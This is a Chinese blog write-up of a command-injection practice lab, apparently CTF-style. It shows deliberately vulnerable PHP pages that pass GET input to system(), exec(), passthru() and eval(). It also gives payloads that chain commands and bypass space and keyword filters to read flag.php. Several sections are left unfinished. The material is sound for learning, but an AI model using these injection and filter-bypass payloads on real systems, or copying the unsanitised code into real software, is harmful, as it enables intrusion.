---
title: 命令执行靶场WP
categories:
  - 学习
tags:
  - 命令执行
  - WP
abbrlink: 94661a9
---

### 0x01 命令执行危险函数

#### `system()`函数

`system()`函数有回显，只是要通过查询源代码才能看到

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["benben"];
if(isset($cmd)){
    system($cmd);
}
```

观察题目，只是一个命令执行，没有任何过滤。

直接执行`ls`查看文件，再用`cat flag.php`获取`flag`

（关于为什么这里执行不用带""引号可以查看我的另一篇文章[奇奇怪怪的问题 | FLYFISH](https://flyfish567.github.io/posts/36c39f99.html)）

#### `exec()`函数

`exec()`函数要将命令执行内容存在数组中，再用`print_r($array)输出`

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
exec($cmd,$array);
print_r($array);
?>
```

分析过程如如上题

直接执行`ls`查看文件，再用`cat flag.php`获取`flag`

#### `passthru()`函数

用法和`system()`类似，也是执行命令后有回显

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
echo "This is test!!!";
passthru($cmd);
?>
```

直接执行`ls`查看文件，再用`cat flag.php`获取`flag`

#### `shell_exec()`函数

和`exec()`差不多，都没有回显，只不过`exec()`通过将输出内容存入数组中输出`exec(ls,array);echo array的方式`，而`shell_exec()`通过中间变量或者直接用`echo`输出

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$output = shell_exec($cmd);
echo $output;
?>
```

直接执行`ls`查看文件，再用`cat flag.php`获取`flag`

### 0x02 过滤命令执行函数

### 0x03 命令连接符

命令链接符号有五个`;` `&` `&&` `|` `||`

`;`依次执行

`&`同时执行(记得URL编码%26)

`&&` 若前面执行成功则执行后面；若前面执行失败则不执行后面

`|`将前面命令执行后内容作为后面命令输入

`||`类似`if-else`，前面执行成功后面不执行，前面执行失败后面不执行

#### 链接演示1

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
if(isset($cmd)){
  system("ls".$cmd);
}
?>
```

**分析代码：**

可以发现`system()`语句中已经包含了一个ls，并且ls后`.`链接了输入的命令。因此如果输入任何命令都会和ls组合，变成无法识别的命令.

只能先输入?cmd=%20 可以先查看所有文件，得到`1.php 2.php flag.php`。所以只要查看`flag,php`即可

但是直接输入命令会和ls组合，只能使用命令链接符进行组合

**解法一**

 使用`;`，将ls同后面的命令隔离开，依次执行

`?cmd=;cat flag.php`可查看到flag

**解法二**

 使用`&`，将ls同后面的命令隔离开，同时执行

`?cmd=&cat flag.php`可查看到flag（记得将&进行url编码）

**解法三**

 使用`&&`，将ls同后面的命令隔离开，前面ls可以执行，因此后面`cat flag.php`可执行

`?cmd=&&cat flag.php`可查看到flag（记得将&进行url编码）

**解法四**

 使用`||`，将ls同后面的命令隔离开，要使得前面命令不能执行，所以可以将ls后添加任意字符

`?cmd=666||cat flag.php`可查看到flag

#### `||`拼接

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
$cmd = $cmd." >/dev/null 2>&1";
if(isset($cmd)){
    system($cmd);
}
?> 
```

**分析代码**

`$cmd = $cmd." >/dev/null 2>&1";`将输入的命令后加入了` >/dev/null 2>&1`(即将命令执行后的内容删除，即使执行成功也不会回显)，所以要通过||链接符号，使得前面命令成功执行，后面命令不执行。

`?cmd=ls|| 查看文件  ?cmd=cat flag.php|| 读取flag`

### 0x04空格过滤

#### 空格过滤

**大括号`{cat,flag.txt}`**

```
?cmd=system('{cat,flag.php}')
```

**$IFS代替空格**

可用**`$IFS`** **`${IFS}`** **`$IFS$9`**代替空格

```
?cmd=system('cat${IFS}flag.php')
```

**重定向字符`<``<>`**

`<`表示的是输入重定向，即把`<`后面跟的**文件**取代键盘作为新的输入设备

```
?cmd=system('cat<flag.php')
```

**URL编码**

`Tab URL编码 %09` `space URL编码 %20`

一般过滤了空格同时也过滤了%20,所以推荐使用`%09`成功率更高

```
?cmd=system('cat%09flag.php')
```

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
if(isset($cmd)){
    $cmd = preg_replace("# #","",$cmd);
    echo "过滤后的命令：".$cmd."</br >";
    echo "命令执行结果如下：";
    system($cmd);
}
?>

```

**分析代码**

` $cmd = preg_replace("# #","",$cmd);`这行代码可以发现过滤了空格，也就是`cat flag.php`这里会被过滤为`catflag.php`,无法正确执行命令。可先用ls查看文件

所以只需要用其他东西代替括号就可以了

**解法一**

用大括号`{cat,flag.txt}`

**解法二**

用**`$IFS`** **`${IFS}`** **`$IFS$9`**代替空格

`cat${IFS}flag.php`

**解法三**

用重定向符号

`cat<flag.php`

**解法四**

用URL编码

`cat%09flag.php`

### 0x05文件名过滤

#### 文件名过滤绕过

**通配符`?` `*`绕过**

`?`可代替单一字符，`*`可代替之后的一串字符

**单引号、双引号绕过**

命令连接符`''` `""` 被解释为空字符 

**反斜杠`\`绕过**

**`\`**作用：去掉特殊字符功能性，单纯表示为字符串；

**特殊变量**

`$1到$9、$@、$*等`

**内联执行** (好麻烦,先不考虑)

~~不想写了~~

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match("/flag|system|php/i", $cmd)) {
        eval($cmd);
    }
    else{
        echo "命令有问题哦，来黑我丫！！！";
        }
}
```

**分析代码**

过滤flag、system、php，system可以用passthru替代，但是文件名字无法替代，因此可以通过模糊字符，字符隔断，内联查询（不演示）等

**解法：**

`passthru(cat fla?.ph?)`		

~~其他不想写了~~

### 0x06 文件命令读取绕过

